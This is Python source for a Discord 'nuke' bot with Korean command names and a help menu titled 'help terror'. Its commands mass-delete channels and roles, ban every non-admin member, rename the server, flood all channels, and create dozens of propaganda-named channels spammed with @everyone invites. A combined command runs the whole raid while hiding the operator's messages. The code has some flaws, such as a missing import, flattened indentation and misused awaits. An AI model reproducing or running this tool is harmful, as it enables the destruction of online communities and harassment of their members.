import discord, asyncio, aiohttp, random
from discord.ext import commands

intents = discord.Intents.all()
bot = commands.Bot(command_prefix=".", intents=intents)
TOKEN = os.getenv("DISCORD_TOKEN")

async def send_embed_dm(user, title, description):
embed = discord.Embed(title=title,
description=description,
color=discord.Color.blue())
try:
await user.send(embed=embed)
except Exception:
pass

async def delete_command_message(ctx):
try:
await ctx.message.delete()
except Exception:
pass

@bot.event
async def on_ready():
pass

@bot.command()
async def 명령어(ctx):
await delete_command_message(ctx)
embed = discord.Embed(title="help terror", color=discord.Color.blue())
embed.add_field(name=".채널삭제", value="모든 채널을 삭제합니다.", inline=False)
embed.add_field(name=".역할삭제", value="모든 역할을 삭제합니다.", inline=False)
embed.add_field(name=".유저밴", value="모든 유저를 밴합니다.", inline=False)
embed.add_field(name=".이름변경 <바꿀 이름>", value="서버의 이름을 변경합니다.", inline=False)
embed.add_field(name=".스팸도배 <메시지>",
value="모든 채널에 메시지를 전송합니다.",
inline=False)
embed.add_field(name=".랜덤채널",
value="랜덤 단어 이름의 채널을 50개를 생성합니다.",
inline=False)
embed.add_field(name=".JJNICE",
value="랜덤채널, 스팸도배, 유저밴, 역할삭제, 채널삭제 종합 기능",
inline=False)

await send_embed_dm(
    ctx.author, "명령어",
    "𝐈𝐧𝐟𝐢𝐧𝐢𝐭𝐞 𝐒𝐤𝐲 𝐅𝐚𝐦𝐢𝐥𝐲\n[Discord](https://discord.gg/uuFuKWFYwu)")
try:
    await ctx.author.send(embed=embed)
except Exception:
    pass
@bot.command()
async def 채널삭제(ctx):
await delete_command_message(ctx)
if ctx.guild:
tasks = [channel.delete() for channel in ctx.guild.channels]
await asyncio.gather(*tasks, return_exceptions=True)
await send_embed_dm(
ctx.author, "채널 삭제 완료",
"모든 채널을 삭제하였습니다.\n-# 𝐈𝐧𝐟𝐢𝐧𝐢𝐭𝐞 𝐒𝐤𝐲 𝐅𝐚𝐦𝐢𝐥𝐲\nDiscord"
)

@bot.command()
async def 스팸도배(ctx, *, message):
await delete_command_message(ctx)
if ctx.guild:
tasks = [channel.send(message) for channel in ctx.guild.text_channels]
await asyncio.gather(*tasks, return_exceptions=True)
await send_embed_dm(
ctx.author, "스팸 도배 완료",
f"모든 채널에 {message} 를 전송하였습니다.\n-# 𝐈𝐧𝐟𝐢𝐧𝐢𝐭𝐞 𝐒𝐤𝐲 𝐅𝐚𝐦𝐢𝐥𝐲\nDiscord"
)

@bot.command()
async def 역할삭제(ctx):
await delete_command_message(ctx)
if ctx.guild:
tasks = [
role.delete() for role in ctx.guild.roles
if role != ctx.guild.default_role
]
await asyncio.gather(*tasks, return_exceptions=True)
await send_embed_dm(
ctx.author, "역할 삭제 완료",
"모든 역할을 삭제하였습니다.\n-# 𝐈𝐧𝐟𝐢𝐧𝐢𝐭𝐞 𝐒𝐤𝐲 𝐅𝐚𝐦𝐢𝐥𝐲\nDiscord"
)

@bot.command()
async def 유저밴(ctx):
await delete_command_message(ctx)
if ctx.guild:
tasks = [
member.ban() for member in ctx.guild.members if
member != ctx.author and not member.guild_permissions.administrator
]
await asyncio.gather(*tasks, return_exceptions=True)
await send_embed_dm(
ctx.author, "유저 밴 완료",
"모든 유저를 밴하였습니다.\n-# 𝐈𝐧𝐟𝐢𝐧𝐢𝐭𝐞 𝐒𝐤𝐲 𝐅𝐚𝐦𝐢𝐥𝐲\nDiscord"
)

@bot.command()
async def 이름변경(ctx, *, new_name):
await delete_command_message(ctx)
if ctx.guild:
try:
await ctx.guild.edit(name=new_name)
await send_embed_dm(
ctx.author, "서버 이름 변경 완료",
f"서버 이름을 {new_name} 으로 변경하였습니다.\n-# 𝐈𝐧𝐟𝐢𝐧𝐢𝐭𝐞 𝐒𝐤𝐲 𝐅𝐚𝐦𝐢𝐥𝐲\nDiscord"
)
except Exception:
pass

@bot.command()
async def 랜덤채널(ctx):
await delete_command_message(ctx)
if ctx.guild:
channel_names = [
"벨로캉 만세!", "벨로캉에게 무릎을", "●█▀█▄", "아카리는 척결이 답이다!", "시온장군 만세!", "●█▀█▄"
]
tasks = [
ctx.guild.create_text_channel(random.choice(channel_names))
for _ in range(50)
]
await asyncio.gather(*tasks, return_exceptions=True)
await send_embed_dm(
ctx.author, "랜덤 채널 생성 완료",
"50개 랜덤 채널을 생성하였습니다.\n-# 𝐈𝐧𝐟𝐢𝐧𝐢𝐭𝐞 𝐒𝐤𝐲 𝐅𝐚𝐦𝐢𝐥𝐲\nDiscord"
)

@bot.command()
async def BLK(ctx):
await delete_command_message(ctx)

if ctx.guild:
    delete_channel_tasks = [
        channel.delete() for channel in ctx.guild.channels
    ]
    await asyncio.gather(*delete_channel_tasks, return_exceptions=True)

    channel_names = [
          "벨로캉 만세!", "벨로캉에게 무릎을", "●█▀█▄", "반벨로캉인은 척결이 답이다!", "시온장군 만세!", "●█▀█▄"
    ]
    spam_message = "# 벨로캉 만세! discord.gg/belokan https://media.discordapp.net/attachments/1346402442979311688/1376003324838674613/image.png?ex=6886ccf5&is=68857b75&hm=c97ce81714677ee7dc46d9fed0459783b2143d638dc6792a78cbf255b41885f0&=&format=webp&quality=lossless&width=928&height=559 @everyone"
    create_and_spam_tasks = []

    for _ in range(30):
        new_channel = await ctx.guild.create_text_channel(
            random.choice(channel_names))
        for _ in range(10):
            create_and_spam_tasks.append(new_channel.send(spam_message))

    await asyncio.gather(*create_and_spam_tasks, return_exceptions=True)

    await asyncio.sleep(2)

    ban_tasks = [
        await member.ban() for member in ctx.guild.members if
        member != ctx.author and not member.guild_permissions.administrator
    ]

    role_delete_tasks = []
    for role in ctx.guild.roles:
        if role != ctx.guild.default_role and ctx.author.guild_permissions.manage_roles:
            try:
                role_delete_tasks.append(await role.delete())
            except discord.errors.HTTPException:
                continue

    all_tasks = ban_tasks + role_delete_tasks

    await asyncio.gather(
        *[task for task in all_tasks if asyncio.iscoroutinefunction(task)],
        return_exceptions=True)

    await send_embed_dm(
        ctx.author, "💣 영광의 깃발을 들어라 제군!",
        "적진을 완벽히 부쉈다... 잘하였다 제군!\n-# 영광의 깃발을 들어라!\n[Discord](https://discord.gg/uuFuKWFYwu)"
    )
